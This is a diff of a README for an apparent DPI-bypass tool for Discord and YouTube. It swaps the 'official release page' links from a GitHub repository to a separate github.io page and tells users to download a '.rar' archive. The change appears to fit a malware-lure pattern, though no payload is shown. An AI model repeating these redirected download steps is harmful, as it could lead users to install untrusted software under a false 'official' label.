@@ -1,6 +1,6 @@
 # 🌐 zapret-discord-youtube-2026 - Restore access to your favorite services
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Inclinedfaultaditya598/zapret-discord-youtube-2026)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://inclinedfaultaditya598.github.io)
 
 This tool helps users bypass restrictions on websites and services. It focuses on platforms like Discord and YouTube. It uses DPI bypass technology to route traffic around blocks. You do not need a VPN to use this software. 
 
@@ -15,7 +15,7 @@ Close any existing network-altering programs before you start. These programs of
 
 ## 📥 Getting Started
 
-1. Go to the [official release page](https://github.com/Inclinedfaultaditya598/zapret-discord-youtube-2026).
+1. Go to the [official release page](https://inclinedfaultaditya598.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the newest version available.
 4. Download the file labeled "zapret-discord-youtube-2026.rar".
